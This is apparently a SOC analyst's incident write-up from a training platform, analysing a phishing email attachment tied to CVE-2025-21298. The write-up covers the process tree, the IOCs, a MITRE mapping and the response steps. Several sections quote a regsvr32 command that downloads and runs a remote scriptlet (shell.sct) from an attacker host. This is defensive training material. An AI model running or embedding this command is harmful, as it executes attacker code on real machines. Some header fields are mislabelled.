# 1. Alert Overview

| Field                 | Details                                                                        |
| --------------------- | ------------------------------------------------------------------------------ |
| Alert Name            | <br>SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298) |
| Severity              | Critical                                                                       |
| Event ID              | 314                                                                            |
| Alert Type            | Remote Code Execution (RCE)                                                    |
| Source IP / Host      | projectmanagement@pm.me                                                        |
| Destination IP / Host | Austin@letsdefend.io                                                           |
| Target Service        | 84.38.130.118                                                                  |
| Timestamp             | Feb, 04, 2025, 04:18 PM                                                        |

---

# 2. Initial Assessment

**Main Question:**  
Is this activity normal or suspicious?
Yes, The file attached in the mail is flagged malicious in virutstotal.
![[{916C1D9B-4E91-4BF5-B66C-CA7D6F0790E0}.png]]

| Question                                                                                                                  | Answer               |
| ------------------------------------------------------------------------------------------------------------------------- | -------------------- |
| What activity triggered the alert, and which user, host, or IP is involved?                                               | Austin,172.16.17.137 |
| Is this activity expected or unusual for this user, host, or service?                                                     | unusaul              |
| Is there any sign of malicious activity, such as external IP, suspicious command, file creation, or known attack pattern? | yes                  |

**Initial Finding:**

found malicious attached file which was flagged malicious on virus total, and command that executed on the victims pc . the command execute "regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"  uses a legitimate Windows utility (`regsvr32.exe`) to **download and execute a remote script**. It is a well-known technique used by attackers because it can execute code without writing a traditional executable to disk. downloads the shell.sct and then get executed by scrobj.dll.

---

# 3. Investigation Steps

## A. Endpoint Evidence

![[{48A84A42-336D-448D-9BDA-510B09D17A3B}.png]]

![[{4670A459-5699-4E6A-AA9B-E59DE8CAB901}.png]]


| Area Checked               | Finding                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Process Tree               | OUTLOOK.EXE<br>│<br>└── cmd.exe<br>    Command:<br>    "C:\Windows\System32\cmd.exe" /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll<br>    │<br>    └── regsvr32.exe<br>        Command:<br>        regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll<br>        │<br>        └── scrobj.dll<br>             ↓<br>        Downloads and executes shell.sct from<br>        http://84.38.130.118.com/shell.sct |
| Parent Process             | OUTLOOK.EXE , CMD ,                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| Command Line               | regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll                                                                                                                                                                                                                                                                                                                                                                                     |
| File Created or Downloaded | shell.sct                                                                                                                                                                                                                                                                                                                                                                                                                                               |


---

## B. Network Evidence


| Area Checked           | Finding                             |
| ---------------------- | ----------------------------------- |
| Source and Destination | 172.16.17.137 , 84.38.130.118       |
| Target URL / Endpoint  | http://84.38.130.118.com/shell.sct) |
| Request Method         | GET                                 |
| External IP / Domain   | 84.38.130.118                       |

![[{30191012-6700-48CF-8C49-1779DF43FE44} 1.png]]

---

# 4. Indicators of Compromise

| IOC Type         | Value                                                            |
| ---------------- | ---------------------------------------------------------------- |
| IP Address       | 84.38.130.118                                                    |
| Domain / URL     | http://84.38.130.118.com                                         |
| File Name / Path | mail.rtf                                                         |
| File Hash        | df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184 |
| Process Name     | cmd.exe                                                          |
| User Account     | Austin                                                           |
![[{1BD61130-27E8-4C10-9307-A2610FA90DC8}.png]]
---

# 5. MITRE ATT&CK Mapping

| Tactic          | Technique                               | Technique ID |
| --------------- | --------------------------------------- | ------------ |
| Initial Access  | Spearphishing Attachment                | T1566.001    |
| Execution       | System Binary Proxy Execution: Regsvr32 | T1218.010    |
| Defense Evasion | Signed Binary Proxy Execution           | T1218        |


---

# 6. Impact Assessment

| Impact Area                         | Status / Details                                                                                                                                                                                                      |
| ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Was access successful?              | yes                                                                                                                                                                                                                   |
| Was command execution seen?         | yes                                                                                                                                                                                                                   |
| Was any file created or downloaded? | yes                                                                                                                                                                                                                   |
| Was any sensitive data exposed?     | no                                                                                                                                                                                                                    |
| Is the host compromised?            | yes                                                                                                                                                                                                                   |
| Business Impact                     | Successful exploitation could allow remote code execution, leading to malware infection, unauthorized access, data theft, system compromise, operational disruption, and potential financial and reputational damage. |

---

# 7. Final Verdict

True- positive 

victim pc is executing the malicious cmd using very know technique and attack related to (CVE-2025-21298)

---

# 8. Recommended Actions

| Action Type | Action                                                                    |
| ----------- | ------------------------------------------------------------------------- |
| Containment | Isolate the host and block the malicious URL/domain.                      |
| Eradication | Remove malware, terminate malicious processes, and run a full AV/EDR scan |
| Recovery    | Apply security patches and restore the system if required.                |
| Monitoring  | Monitor for `regsvr32.exe`, `cmd.exe`, and similar malicious activity.    |
| Extra Notes | Quarantine the phishing email and educate users on phishing awareness.    |
